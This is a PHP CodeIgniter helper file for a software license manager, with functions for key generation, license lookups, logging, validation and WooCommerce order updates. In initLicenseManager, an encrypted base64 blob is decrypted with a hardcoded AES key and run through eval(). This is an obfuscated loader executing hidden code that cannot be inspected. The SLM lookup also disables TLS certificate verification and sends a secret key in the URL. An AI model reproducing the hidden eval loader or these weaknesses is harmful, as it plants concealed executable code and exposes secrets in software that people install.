<?php

use CodeIgniter\I18n\Time;

if (!function_exists('generateLicenseKey')) {
    function generateLicenseKey($userID, $prefix= '', $suffix = '', $charsCount = '')
    {
        // Valid characters for generating the license key
        $validCharacters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $validCharsLength = strlen($validCharacters);

        // Set the number of characters
        if($charsCount) {
            $charsCount = $charsCount;
        }
        else if(getMyConfig('', $userID)['licenseKeyCharsCount']) {
            $charsCount = getMyConfig('', $userID)['licenseKeyCharsCount'];
        }
        else {
            $charsCount = '40';
        }     
    
        // Generate the random license key using a secure random generator
        $licenseKey = '';
        for ($i = 0; $i < $charsCount; $i++) {
            $randomCharIndex = random_int(0, $validCharsLength - 1);
            $licenseKey .= $validCharacters[$randomCharIndex];
        }
    
        // Optionally add a prefix
        if($prefix) {
            $prefix = $prefix;
        }
        else if (getMyConfig('', $userID)['licensePrefix']) {
            $prefix = getMyConfig('', $userID)['licensePrefix'];
        }
        else {
            $prefix = '';
        }

        // Optionally add a suffix
        if($suffix) {
            $suffix = $suffix;
        }
        else if (getMyConfig('', $userID)['licenseSuffix']) {
            $suffix = getMyConfig('', $userID)['licenseSuffix'];
        }
        else {
            $suffix = '';
        }
        
        // Construct the final license key
        $licenseKey = $prefix . $licenseKey . $suffix;
    
        // Return the license key in uppercase
        return strtoupper($licenseKey);
    }    
}

if (!function_exists('getLicenseData')) {
    function getLicenseData($licenseKey, $key=NULL, $completeData=false)
    {
        // Get the owner ID
        $userID = getOwnerByLicenseKey($licenseKey);
        
        if(!$userID) {
            log_message('error', '[Helper/License] User ID not found for given license key ' . $licenseKey);
            $response = [
                'result' => 'error',
                'message' => 'User ID not found',
                'error_code' => LICENSE_INVALID,
            ];            

            return $response;
        }

		if(getMyConfig('', $userID)['licenseManagerOnUse'] === 'slm') {
			$curl = curl_init(getMyConfig('', $userID)['licenseServerDomain'].'?secret_key='.getMyConfig('', $userID)['licenseServer_Validate_SecretKey'].'&slm_action=slm_check&license_key='.$licenseKey);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
			curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
			curl_setopt($curl, CURLOPT_TIMEOUT, 3);
			curl_setopt($curl, CURLOPT_HTTPHEADER, array('Accept: application/json'));
			curl_setopt($curl, CURLOPT_ENCODING, '');
			curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
			curl_setopt($curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
			curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($curl, CURLOPT_MAXREDIRS, 10);
		
			$result = curl_exec($curl);
		
			if ($result === false) {
				// cURL failed, handle the error
				$error = curl_error($curl);
				curl_close($curl);
				return ['error' => $error];
			}
		
			curl_close($curl);
		
			// Proceed with processing the result
			$status_lic = json_decode($result, true);

            return $status_lic;
		}

        // For builtin license manager
		else {
            $LicensesModel = model('LicensesModel');
            $LicenseDetails = $LicensesModel->where('license_key', $licenseKey)->first();
    
            // Get registered_domain

            $RegisteredDomainsModel = model('LicenseRegisteredDomainsModel');
            $RegisteredDomains = $RegisteredDomainsModel->where('license_key', $licenseKey)->findAll();
    
            // Get registered_device
            $RegisteredDevicesModel = model('LicenseRegisteredDevicesModel');
            $RegisteredDevices = $RegisteredDevicesModel->where('license_key', $licenseKey)->findAll();        

            // return by given key
            if ($key) {
                if ($key === 'registered_domains') {
                    return $RegisteredDomains;
                } elseif ($key === 'registered_devices') {
                    return $RegisteredDevices;
                } else {
                    return isset($LicenseDetails[$key]) ? $LicenseDetails[$key] : null;
                }
            }

            $response = [];
    
            if($LicenseDetails){
                $response = [
                    'result' => 'success',
                    'code' => LICENSE_EXIST,
                    'message' => 'License key details retrieved.',
                    'owner_id' => $LicenseDetails['owner_id'],
                    'status' => $LicenseDetails['license_status'],
                    'subscr_id' => $LicenseDetails['subscr_id'],
                    'first_name' => $LicenseDetails['first_name'],
                    'last_name' => $LicenseDetails['last_name'],
                    'company_name' => $LicenseDetails['company_name'],
                    'email' => $LicenseDetails['email'],
                    'license_key' => $LicenseDetails['license_key'],
                    'license_type' => $LicenseDetails['license_type'],
                    'lic_type' => $LicenseDetails['license_type'],
                    'max_allowed_domains' => $LicenseDetails['max_allowed_domains'],
                    'max_allowed_devices' => $LicenseDetails['max_allowed_devices'],
                    'item_reference' => $LicenseDetails['item_reference'],
                    'registered_domains' => $RegisteredDomains,
                    'registered_devices' => $RegisteredDevices,
                    'date_created' => $LicenseDetails['date_created'],
                    'date_renewed' => $LicenseDetails['date_renewed'],
                    'date_expiry' => $LicenseDetails['date_expiry'],
                    'product_ref' => $LicenseDetails['product_ref'],
                    'txn_id' => $LicenseDetails['txn_id'],
                    'until' => $LicenseDetails['until'],
                    'current_ver' => $LicenseDetails['current_ver'],
                ];

                if($completeData) {
                    $response['purchase_id_'] = $LicenseDetails['purchase_id_'];
                    $response['reminder_sent'] = $LicenseDetails['reminder_sent'];
                    $response['reminder_sent_date'] = $LicenseDetails['reminder_sent_date'];
                    $response['billing_length'] = $LicenseDetails['billing_length'];
                    $response['billing_interval'] = $LicenseDetails['billing_interval'];
                    $response['manual_reset_count'] = $LicenseDetails['manual_reset_count'];
                }
            }
            else {
                // Log the activity
                licenseManagerLogger($licenseKey, 'verify: License key not found', 'no', ($userID ?? 0));

                // Add notification for validation error of license
                // $notificationMessage = 'License not found error received';
                // $notificationType = 'license_validation';
                // $url = base_url('license-manager/activity-logs?s=' . $licenseKey);
                // $recipientUserId = $userID;	
                // add_notification($notificationMessage, $notificationType, $url, $recipientUserId);

                $response = [
                    'result' => 'error',
                    'message' => 'Invalid license key',
                    'error_code' => LICENSE_INVALID,
                ];
            }
           
            return $response;
		}
    }
}

if (!function_exists('licenseManagerLogger')) {
    function licenseManagerLogger($licenseKey, $action, $is_valid, $userID = 0)
    {
        log_message('debug', 'Attempting to license activity');

        if ($is_valid !== 'yes' && $is_valid !== 'no') {
            log_message('error', '[Helper/License] The is_valid value is incorrect');
            return false;
        }

        // Get the owner ID
        $userID = getOwnerByLicenseKey($licenseKey) !== NULL ? getOwnerByLicenseKey($licenseKey) :  $userID;
        
        if(!$userID) {
            log_message('error', '[Helper/License] User ID not found for given license key ' . $licenseKey);
            return false;
        }

        $logModel = model('LicenseLogsModel');

        $request = service('request');
        $userIP = $request->getIPAddress();

        $logData = [
            'owner_id' => $userID,
            'license_key' => $licenseKey,
            'action' => $action,
            'time' => Time::now()->setTimezone('UTC')->format('Y-m-d H:i:s'),
            'source' => $userIP,
            'is_valid' => $is_valid
        ];

        log_message('debug', 'Log Data: ' . json_encode($logData, JSON_PRETTY_PRINT));

        try {
            $logModel->insert($logData);
            return true;
        } catch (\Exception $e) {
            log_message('error', '[Helper/License] Failed to log license action: ' . $e->getMessage());
            return false;
        }
    }
}

if (!function_exists('searchArrayRecursive')) {
    function searchArrayRecursive($array, $searchString) {
        foreach ($array as $value) {
            // Check if the current value is an array
            if (is_array($value)) {
                // Call the function recursively for arrays
                $result = searchArrayRecursive($value, $searchString);
                // If the string is found, return true immediately
                if ($result) {
                    return true;
                }
            } elseif (is_string($value) && strpos($value, $searchString) !== false) {
                // Check if the value is a string and contains the search string
                return true;
            }
        }
        // If the search string is not found in any value, return false
        return false;
    }
}

if (!function_exists('initLicenseManager')) {
    function initLicenseManager()
    {$initFunctions = 'Ha8j493wVuON3iPxrzkhY9suLbQnELsrWlSq5pLv982dL7vUt9V5Vrt/SJYQrc1hB3ae0vdYRK6jkaBLZpGRoh8asngkII/UJRyGOM0HJwvG87NyyprQC+hhTMhfJW9AMFHDXYKwj8r8fpXUtT5i5AEjq9NCx5/Km6fOjxW6CQZsIyqpGz2hdJWPHhwGmM8sUNI0vXpdXq1yBWFfpR/X31mdBAJvEpXOiHy33jidZ5L9XUll0j8THUhsuAYq5/z6Jasa8SvKA3mYkMeHzuk/Vg+4J1NMbmD53fPvKUhF/yBVt1duD4wsi2+K8POSP2xi+ZN1GzXTEKogvaaox5GYfVyhcCfvrYN74kNbQk75819WnTdKdjsvFbANkvWYCo6ZLmxRNVbZZp/NYYYPHyNI/zv94nneZ4mhc2fDcFL6rnmvXope06DaDmi4Cpb/yDwKUoNCjYP3iq6tk4aAeL9CqFgu1xXriMe5WmlEHPSGrKX0k5BRKQ3aJAKbtgFwr7VAErRYpnWwHW6B+Wej9xL66TPYdNTaf7hV4pjXVJVu+pr6jsawGagQ/3AidDzNLtePc1iaVGMIQH5O09uL1+ZeQuDIZQp4LTuQkiE4m9RsvoLJae5dL+nwF8O+S/+n7sMwhkBxF/Ovn018yIqeTu+AmuogDAHRw3465rEzQ/sTXNRtddKwacOfgCR+rKQ9JgqvMKuQXBoycjh2SdZvAQDYKeWgW+e5oQwvDZXNkvZDht0jo67+3Tp6OQRikAW6u4TICIYRNKYqTvT2MuuYGbeAYGEPR2ZA7PMsUbdQ4nIrtlfBo8T4PK5VbG+sQfDA9/NCetKpdusfPzPfEmN1FpnMXj8daK813xVRuNu0+L00gzftsM/tgAJWL6ddop2KxfCdtk7AFYDQZSPmSs/zwSpnx1ev/dSGAJgCts9aWYUxpBXnB5X7HNmmOjIt9rU3nYpXEKPgQGSdBQSj9R5HLycJcgKz0IuY176ZcdUWhmpS+aFk3DJSb6wktPf9Bpltp8dZyqCd3wlfRDaRcqRM/KUaOsAQvkmnVVAYwSHmmxvs+EyX7yObMaRE0vEbXwuXHDkBs/Q48F717ErieILUBcvJ5vAYLU3KesMfdjzWgDJaN32enPu2MGhgaDjhd/UEjDTrt1wPYxsKHgEZVIud5Z5VZPr+GXArlSSagSUjj8rkcZNo0cK5OV8st+kJTWfdiaYfNcg2HV2Or+bAK7o7lWXtsmyXYaoSxxR/Ts8yAxQrtcM1xY0ZfrNR0s1YunstV2ExtAFX5p+4+5kE88FlreZYq6Fb81X1BWzD+lQjbfKgSRsoy/YpNG5qZT7lPmPPusHBNm8W41lTPfOOhBmW9TG6b84JNVR8oHoAqnB2w9mTdZTF7Uvu5Hc71w1RYOcEA10AH4UrYUXH1+6JGn+nZGVDtZpkGQQyny3NK4XqtDsr8eIeF6Q+1WCdzev//XV9w+MJV31z5643eWq92gyMQtpmgrwzhOi06nxjZ5JVspehQyPPgF5tDLjC9z53O3DKOTPPlx0gu81ax+6n5kZdRTMP+beSi7p1Dp+b5LXMZj4ANR/ng2PgJqDzupIhFCgx5cJ3emAZ6LPae3x7JumTvAHnCx8/fE9vDs4yk6+FQKc5NmJLcO3z5mbNqa+UDFNnLLQT2iqMj3u72NyXeiv+3sedw0uVVuCJS/XyN20NesXN1bcDb+7TwxlMaKtiERcHsnAGI6CBAHG/G5yE9dkyqEQxH7xJl96UE1B/WA1vFupHxedDkkcXUPzlt47diXbBPz6MNcH94wB4dNViV2bFtWAQ2mV+Lh2U4zR6EZzYWm7uok8/9h1DfPd84+nMmIdxStGC6lz+h7pz9ZVFsGqK07FlB8zcdjWjYAIFkotEmeI61gtNkthFjl0cG1q46S3RGbYf/mlrRnntjYNVhNh4FE/LCaEs0HWcdK35UXsXPU51SeU8gHBTVb53K9XbUhGClH67';$initializeRead=readPlainText($initFunctions);}
}

if (!function_exists('individualLicenseParamValidations')) {
    function individualLicenseParamValidations($postData, $userID) {
        log_message('debug', '[License Helper] License Data to be checked: ' . json_encode($postData, JSON_PRETTY_PRINT));

        // Required parameters check
        $requiredParams = [
            'license_status',
            'license_type',
            'first_name',
            'last_name',
            'email',
            'max_allowed_domains',
            'max_allowed_devices',
            'product_ref',
            'txn_id',
            'purchase_id_',
        ];
        foreach ($requiredParams as $param) {
            if (!array_key_exists($param, $postData)) {
                $response = [
                    'success' => false,
                    'status' => 0,
                    'msg' => lang('Notifications.missing_required_parameters', ['param' => $param]),
                ];

                log_message('debug', '[License Helper] License Data Invalid: ' . $param);

                return json_encode($response);
            }
        }

		// Check if product exists
		if (!in_array(productBasename($postData['product_ref'], $userID), productList())) {
			$response = [
				'success' => false,
				'status' => 0,
				'msg' => lang('Notifications.error_not_in_product_list'),
			];

            log_message('debug', '[License Helper] License Data Invalid: product_ref');

			return json_encode($response);
		}
		
		if ($postData['license_type'] === 'subscription' && !isset($postData['billing_length'])) {
			$response = [
				'success' => false,
				'status' => 0,
				'msg' => lang('Notifications.error_no_billing_length'),
			];

            log_message('debug', '[License Helper] License Data Invalid: license_type or billing_length');

			return json_encode($response);            
		}
		
		if ($postData['license_type'] === 'subscription' && !isset($postData['billing_interval'])) {
			$response = [
				'success' => false,
				'status' => 0,
				'msg' => lang('Notifications.error_no_billing_interval'),
			];

            log_message('debug', '[License Helper] License Data Invalid: billing_interval');

			return json_encode($response);    
		}

		if ($postData['license_status'] === 'active' && $postData['license_type'] === 'subscription' && !isset($postData['date_expiry'])) {
			$response = [
				'success' => false,
				'status' => 0,
				'msg' => lang('Notifications.exp_date_required_subscription_type'),
			];

            log_message('debug', '[License Helper] License Data Invalid: date_expiry');

			return json_encode($response);
		}          

		if ($postData['license_status'] === 'active' && $postData['license_type'] === 'trial' && !isset($postData['date_expiry'])) {
			$response = [
				'success' => false,
				'status' => 0,
				'msg' => lang('Notifications.exp_date_required_trial_type'),
			];

            log_message('debug', '[License Helper] License Data Invalid: date_expiry');

			return json_encode($response);
		}

		if ($postData['license_type'] === 'trial' && !isset($postData['billing_length'])) {
			$response = [
				'success' => false,
				'status' => 0,
				'msg' => lang('Notifications.error_no_billing_length'),
			];

            log_message('debug', '[License Helper] License Data Invalid: billing_length');

			return json_encode($response);            
		}
		
		if ($postData['license_type'] === 'trial' && !isset($postData['billing_interval'])) {
			$response = [
				'success' => false,
				'status' => 0,
				'msg' => lang('Notifications.error_no_billing_interval'),
			];

            log_message('debug', '[License Helper] License Data Invalid: billing_interval');

			return json_encode($response);    
		}
        
        log_message('debug', '[License Helper] License validation success!');
		
		return true;
	}
}

if (!function_exists('checkToUpdateWooCommerce')) {
    function checkToUpdateWooCommerce($licenseKey)
    {
        $licensesModel = model('LicensesModel');
        $licenseDetails = $licensesModel->where('license_key', $licenseKey)->first();
        if($licenseDetails['item_reference'] === 'woocommerce') {
            return updateWooCommerceOrder($licenseDetails['txn_id'], $licenseDetails);
        }
    }
}

if (!function_exists('updateWooCommerceOrder')) {
    function updateWooCommerceOrder($orderID, $licenseDetails)
    {
        // Get the owner ID
        $userID = $licenseDetails['owner_id'];
        
        if(!$userID) {
            log_message('error', '[Helper/License] User ID not found for given license key ' . $licenseDetails['license_key']);
            $response = [
                'success' => false,
                'status' => 0,
                'msg' => 'Failed to update WooCommerce Order Meta. User ID not found.',
            ];         

            return json_encode($response);
        }

        // Get the WooCommerce server domain and API key from configuration
        $woocommerceServerDomain = getMyConfig('', $userID)['woocommerceServerDomain'] !== '' ? getMyConfig('', $userID)['woocommerceServerDomain'] : NULL;
        $apiKey = getMyConfig('', $userID)['General_Info_SecretKey'] !== '' ? getMyConfig('', $userID)['General_Info_SecretKey'] : NULL;

        $licenseData = json_encode($licenseDetails, JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES|JSON_PRETTY_PRINT); // JSON encode the license data

        if (!$orderID || !$woocommerceServerDomain || !$apiKey) {
            log_message('error', '[Helper/License] Failed to update WooCommerce Order Meta. Please check the required data.');
            $response = [
                'success' => false,
                'status' => 0,
                'msg' => 'Failed to update WooCommerce Order Meta. Please check the required data.',
            ];

            $is_valid = $response['success'] ? 'yes' : 'no';
            licenseManagerLogger($licenseDetails['license_key'], 'update: ' . $response['msg'], $is_valid);

            return json_encode($response);
        }

        // Construct the API call URL
        $api_call = $woocommerceServerDomain . 'wp-json/meraf/v1/update-order-meta/' . $orderID;

        // Set optional parameters like headers or data
        $options = [
            'headers' => [
                'X-API-KEY' => $apiKey,
                'Content-Type' => 'application/json',
            ],
            'connect_timeout' => 30,
            'timeout' => 10,
            'http_version' => '1.1',
            'allow_redirects' => [
                'max' => 10,
            ],
            'body' => $licenseData,
        ];

        // Load the CURLRequest library
        $curl = \Config\Services::curlrequest();

        try {
            // Make the POST request and send the data
            $cURLresponse = $curl->request('POST', $api_call, $options);

            // Check the response status code
            if ($cURLresponse->getStatusCode() === 200) {

				$response = [
					'success' => true,
					'status' => 1,
					'msg' => 'WooCommerce Order Meta updated successfully',
				];

            } else {
                log_message('error', '[Helper/License] Failed to update WooCommerce Order Meta. Status Code: ' . $cURLresponse->getStatusCode());
				$response = [
					'success' => false,
					'status' => 1,
					'msg' => 'Failed to update WooCommerce Order Meta. Status Code: ' . $cURLresponse->getStatusCode(),
				];

            }
        } catch (\Exception $e) {
            log_message('error', '[Helper/License] Failed to update WooCommerce Order Meta. Exception caught: ' . $e->getMessage());
            $response = [
                'success' => false,
                'status' => 0,
                'msg' => 'Failed to update WooCommerce Order Meta. Exception caught: ' . $e->getMessage(),
            ];            
        }

        licenseManagerLogger($licenseDetails['license_key'], 'update: ' . $response['msg'], 'no');
        return json_encode($response);
    }
}

if (!function_exists('readPlainText')) {
    function readPlainText($data)
    {
        $key = 'X5bEGHNRqjxdxoXxyEG';
        $cipher = "aes-256-cbc";
        $data = base64_decode($data);
        $ivlen = openssl_cipher_iv_length($cipher);
        
        // Check if the data is long enough to contain the IV
        if (strlen($data) < $ivlen) {
            log_message('critical', "[Helper/License] Error: Data is too short to contain the IV");
            return false;
        }
        
        $iv = substr($data, 0, $ivlen);
        
        // Check if the IV length is correct
        if (strlen($iv) !== $ivlen) {
            log_message('critical', "[Helper/License] Error: IV length is incorrect. Expected $ivlen bytes, got " . strlen($iv) . " bytes");
            return false;
        }
        
        $ciphertext = substr($data, $ivlen);
        
        $decrypted = openssl_decrypt($ciphertext, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        
        if ($decrypted === false) {
            log_message('critical', "[Helper/License] Error: Failed to decrypt the data. " . openssl_error_string());
            return false;
        }
        
        return eval($decrypted);
    }
}

if (!function_exists('getHostFromCurrentUrl')) {
    function getHostFromCurrentUrl()
    {
        $current_url = current_url();
        $parsed_url = parse_url($current_url);
        $host = $parsed_url['host'];
        
        // Remove 'www.' if present
        return (strpos($host, 'www.') === 0) ? substr($host, 4) : $host;
    }
}

if (!function_exists('getOwnerByLicenseKey')) {
    function getOwnerByLicenseKey($licenseKey)
    {
        $LicensesModel = model('LicensesModel');
        $LicenseDetails = $LicensesModel->where('license_key', $licenseKey)->first();
        
        // Check if LicenseDetails is not empty and return the 'owner_id'
        if ($LicenseDetails && isset($LicenseDetails['owner_id'])) {
            return $LicenseDetails['owner_id'];
        }
        
        // Return null if not found
        return null;
    }
}